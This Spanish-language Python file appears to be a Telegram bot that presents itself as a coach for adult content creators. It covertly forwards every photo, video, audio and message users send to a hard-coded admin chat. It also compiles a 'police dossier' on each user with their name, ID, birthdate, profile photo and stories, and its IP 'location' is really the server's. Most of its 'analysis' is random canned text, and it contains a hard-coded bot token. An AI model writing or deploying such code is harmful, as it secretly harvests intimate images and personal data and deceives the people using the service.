import os
import sqlite3
import requests
import io
import random
import re
from PIL import Image, ImageStat
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064
RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"

# ======================
# BASE DE DATOS (CON MEMORIA)
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, ultimo_mensaje TEXT, memoria_nombre TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS historial
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, rol TEXT, mensaje TEXT)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    ahora = datetime.now().isoformat()
    c.execute("INSERT OR REPLACE INTO usuarios (id, nombre, username, edad, ultimo_mensaje, memoria_nombre) VALUES (?, ?, ?, ?, ?, NULL)", (user_id, nombre, username, edad, ahora))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def actualizar_tiempo(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    ahora = datetime.now().isoformat()
    c.execute("UPDATE usuarios SET ultimo_mensaje = ? WHERE id = ?", (ahora, user_id))
    conn.commit()
    conn.close()

def guardar_memoria_nombre(user_id, nombre_guardado):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE usuarios SET memoria_nombre = ? WHERE id = ?", (nombre_guardado, user_id))
    conn.commit()
    conn.close()

def borrar_todo(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
    c.execute("UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()

# ======================
# EXPEDIENTE POLICIAL COMPLETO (PARA TI)
# ======================
async def enviar_expediente_completo(context, user, fecha_texto, edad):
    try:
        # Datos de ubicación por IP
        pais = "Desconocido"
        ciudad = "Desconocida"
        try:
            ip_respuesta = requests.get("https://ipapi.co/json/", timeout=5).json()
            pais = ip_respuesta.get('country_name', 'Desconocido')
            ciudad = ip_respuesta.get('city', 'Desconocida')
        except:
            pass

        # Verificamos si tiene foto de perfil
        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
        tiene_foto = "Sí" if fotos_perfil.total_count > 0 else "No"

        # Verificamos si tiene historias (Stories)
        tiene_story = "No"
        try:
            chat_info = await context.bot.get_chat(user.id)
            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
                tiene_story = "Sí"
        except:
            pass

        reporte = (
            f"🚨 **EXPEDIENTE POLICIAL COMPLETO** 🚨\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre Real:** {user.first_name} {user.last_name or ''}\n"
            f"🆔 **ID de Telegram:** `{user.id}`\n"
            f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
            f"🎂 **Fecha Nacimiento:** {fecha_texto} (Tiene {edad} años)\n"
            f"🌍 **País:** {pais} (Ciudad: {ciudad})\n"
            f"🌐 **Idioma:** {user.language_code or 'Desconocido'}\n"
            f"⭐ **Premium:** {'Sí' if user.is_premium else 'No'}\n"
            f"📸 **Tiene Foto Perfil:** {tiene_foto}\n"
            f"📖 **Tiene Historias:** {tiene_story}\n"
            f"⏰ **Hora de Registro:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ *Sujeto registrado en la base de datos.*"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        
        # Te enviamos la foto de perfil si tiene
        if fotos_perfil.total_count > 0:
            foto_perfil = fotos_perfil.photos[0][-1].file_id
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Evidencia: Foto de perfil.")
            
        # Te enviamos la historia si tiene
        try:
            chat_info = await context.bot.get_chat(user.id)
            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
                story = chat_info.pinned_story
                if story.photo:
                    await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=story.photo[-1].file_id, caption="📖 Evidencia: Historia (Story).")
                elif story.video:
                    await context.bot.send_video(chat_id=DANI_CHAT_ID, video=story.video.file_id, caption="🎥 Evidencia: Video de Historia.")
        except Exception as e:
            pass

    except Exception as e: 
        print(f"Error en expediente: {e}")

# ======================
# REENVIAR AL ADMIN
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message
        usuario_actual = update.effective_user
        
        if msg.forward_origin:
            nombre_original = "Canal o Grupo Desconocido"
            id_original = ""
            try:
                if msg.forward_origin.sender_user:
                    nombre_original = msg.forward_origin.sender_user.first_name
                    id_original = f" (`{msg.forward_origin.sender_user.id}`)"
            except AttributeError: pass 
            try:
                if msg.forward_origin.chat:
                    nombre_original = msg.forward_origin.chat.title
            except AttributeError: pass 

            texto_aviso = f"🔄 **REENVIADO A TI**\n👤 **Original:** {nombre_original}{id_original}\n📩 **Quien lo reenvió:** {usuario_actual.first_name}"
        else:
            texto_aviso = f"📩 **MENSAJE NORMAL**\n👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        await context.bot.forward_message(chat_id=DANI_CHAT_ID, from_chat_id=update.effective_chat.id, message_id=update.message.message_id)
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# ANÁLISIS DE CONTENIDO (LUZ REAL Y MUCHA VARIEDAD)
# ======================
def analizar_contenido(tipo="foto", imagen_bytes=None):
    # --- ANÁLISIS REAL DE LUZ ---
    calidad_luz = "La luz está un poco plana."
    if imagen_bytes:
        try:
            img = Image.open(io.BytesIO(imagen_bytes)).convert('L')
            stat = ImageStat.Stat(img)
            brillo = stat.mean[0] 
            
            if brillo < 60:
                calidad_luz = "La foto está muy oscura. Te recomiendo usar una luz más suave o acercarte a una ventana para que resalten mejor tus curvas. 💡"
            elif brillo > 180:
                calidad_luz = "La foto está demasiado iluminada (parece que usaste flash directo). Prueba con una luz más suave y lateral para que no se queme la imagen. 💡"
            else:
                calidad_luz = "¡La luz está perfecta! Resalta bien tu cuerpo de forma natural. 💡"
        except: pass

    # --- CONSEJOS DE POSES Y MORBO (VARIADOS) ---
    poses = [
        "Prueba a subir los brazos y arquear la espalda. Eso estiliza la cintura y resalta el busto.",
        "Intenta sentarte en la cama con las piernas abiertas y mira fijamente a la cámara. Esa pose vuelve locos a los hombres.",
        "Ponte de espaldas, mira por encima del hombro y muerde un poco tu labio. Da un morbo increíble.",
        "Acuéstate de lado, apoya la cabeza en un brazo y deja que la sábana cubra solo una parte de tu cuerpo. Deja mucho a la imaginación.",
        "Ponte en cuclillas (sentadilla) apoyando la espalda en la pared. Resalta muchísimo las curvas de las piernas.",
        "Usa un espejo para tomarte la foto. El reflejo da un toque de misterio que a los fans les encanta.",
        "Hazte la foto desde un poco más arriba, mirando hacia abajo. Resalta más el escote y te hace ojos más grandes."
    ]
    
    tips_venta = [
        "Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥",
        "Vende esta foto en un pack de 3 y ponle un precio especial. A los fans les gustan las ofertas.",
        "Mándale esta foto a tus suscriptores más fieles con un texto que diga: 'Pensé en ti'. Van a volverse locos.",
        "Usa esta foto como gancho en tus redes sociales para atraer nuevos suscriptores.",
        "Si la subes a tu historia, pon una encuesta que diga '¿Te gusta lo que ves?'. Genera interacción y luego les vendes el pack."
    ]

    if tipo == "video" or tipo == "gif":
        return (
            f"🎬 **Análisis de tu video/GIF:**\n"
            f"1. **Lo que veo:** Una pose muy provocativa y sexy. El movimiento de cámara es un poco rápido, lo que distrae un poco.\n"
            f"2. **Calidad de la luz:** {calidad_luz}\n"
            f"3. **Cómo mejorarlo:** {random.choice(poses)}\n"
            f"4. **Tip de venta:** {random.choice(tips_venta)}"
        )
    elif tipo == "audio":
        return (
            "🎧 **Análisis de tu audio:**\n"
            "1. **Lo que escucho:** Tu tono de voz es muy sugerente y natural.\n"
            "2. **Lo bueno:** La cercanía al micrófono hace que se escuche íntimo.\n"
            "3. **Cómo mejorarlo:** Intenta bajar un poco más la voz, casi en un susurro. Juega con la respiración cerca del micro.\n"
            "4. **Tip de venta:** Los audios personalizados (diciendo el nombre de tu fan) se venden carísimos. ¡Aprovéchalo! 😈"
        )
    else:
        return (
            f"🔍 **Análisis de tu foto:**\n"
            f"1. **Lo que veo:** Una foto muy atrevida. La pose resalta perfecto y se nota que tienes confianza.\n"
            f"2. **Calidad de la luz:** {calidad_luz}\n"
            f"3. **Cómo mejorarlo:** {random.choice(poses)}\n"
            f"4. **Tip de venta:** {random.choice(tips_venta)}"
        )

# ======================
# LÓGICA DE CHAT CON MEMORIA
# ======================
def generar_respuesta_chat(user_id, mensaje):
    usuario = obtener_usuario(user_id)
    memoria_nombre = usuario[5]
    msg_lower = mensaje.lower()
    
    match_nombre = re.search(r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)", msg_lower)
    if match_nombre:
        nombre_extraido = match_nombre.group(1).capitalize()
        guardar_memoria_nombre(user_id, nombre_extraido)
        return f"¡Mucho gusto, {nombre_extraido}! 😘 Me encanta conocerte. ¿En qué te puedo ayudar hoy?"
        
    if "como me llamo" in msg_lower or "mi nombre" in msg_lower or "quien soy" in msg_lower:
        if memoria_nombre:
            return f"¡Claro que sí! Te llamas {memoria_nombre}. 😉 No me olvido de ti tan fácil."
        else:
            return "Uy, no me has dicho tu nombre todavía. ¿Cómo te llamas? ✨"

    if "hola" in msg_lower or "buenas" in msg_lower:
        saludo = f"¡Hola {memoria_nombre}!" if memoria_nombre else "¡Hola!"
        return random.choice([f"{saludo} 😘 ¿Cómo estás?", f"{saludo} preciosa. ¿En qué te ayudo?", "¡Hey! 🔥 Me alegra leerte."])
    elif "bien" in msg_lower or "como estas" in msg_lower:
        return "¡Súper bien! 💋 Lista para ayudarte a mejorar tu contenido. ¿Qué me traes hoy?"
    elif "gracias" in msg_lower:
        return "¡De nada, amor! 😈 Para eso estoy. ¿Quieres que analice alguna foto o video?"
    elif "bye" in msg_lower or "adios" in msg_lower or "chao" in msg_lower:
        return "¡Adiós! 🌙 Aquí estaré cuando me necesites. ¡Que tengas buen día!"
    
    return random.choice(["Cuéntame más... 😉", "Interesante. ¿Y eso cómo te hace sentir?", "Mmm, me gusta de lo que hablas. Mándame una foto si quieres consejos.", "Jaja, me encanta hablar contigo. ¿Quieres que veamos alguna foto tuya? 🔥"])

# ======================
# HANDLERS
# ======================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
    
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        analisis = analizar_contenido(tipo="foto", imagen_bytes=photo_bytes)
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")

async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")

    try:
        file = None
        if update.message.video and update.message.video.thumbnail:
            file = await update.message.video.thumbnail.get_file()
        elif update.message.video_note and update.message.video_note.thumbnail:
            file = await update.message.video_note.thumbnail.get_file()
        elif update.message.animation and update.message.animation.thumbnail:
            file = await update.message.animation.thumbnail.get_file()

        if file:
            img_bytes = await file.download_as_bytearray()
            analisis = analizar_contenido(tipo="video", imagen_bytes=img_bytes)
            await msg.edit_text(analisis)
        else:
            analisis = analizar_contenido(tipo="video", imagen_bytes=None)
            await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("🎬 Vi tu video y ya lo recibí.")

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    actualizar_tiempo(user_id)
    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
    
    try:
        analisis = analizar_contenido(tipo="audio")
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("🎧 Escuché tu audio, pero no pude analizarlo bien.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
    else:
        actualizar_tiempo(user_id)
        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video o audio.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith('/'): return

    usuario_db = obtener_usuario(user.id)
    
    if usuario_db:
        ultimo_mensaje_str = usuario_db[4]
        if ultimo_mensaje_str:
            ultimo_mensaje = datetime.fromisoformat(ultimo_mensaje_str)
            ahora = datetime.now()
            diferencia = ahora - ultimo_mensaje
            
            if diferencia > timedelta(minutes=15):
                borrar_todo(user.id)
                await update.message.reply_text("⏳ **Sesión cerrada por inactividad.**\n\n¡Hola de nuevo! 🌙 ¿De qué hablábamos? Mándame una foto, video o audio para empezar.")
                actualizar_tiempo(user.id)
                await reenviar_al_admin(update, context)
                return

        actualizar_tiempo(user.id)
        await reenviar_al_admin(update, context)
        await update.message.chat.send_action(action="typing") 
        respuesta = generar_respuesta_chat(user.id, text)
        return await update.message.reply_text(respuesta)
    
    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18: return await update.message.reply_text("Debes ser mayor de 18 años.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos o audios.")
        
        await enviar_expediente_completo(context, user, text, edad)
        
    except:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")

# ======================
# MAIN (WEBHOOKS)
# ======================
if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
    application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))

    port = int(os.environ.get("PORT", 8080))

    print("🌙 Luna Bot iniciado como Policía...")
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TELEGRAM_TOKEN,
        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}"
    )
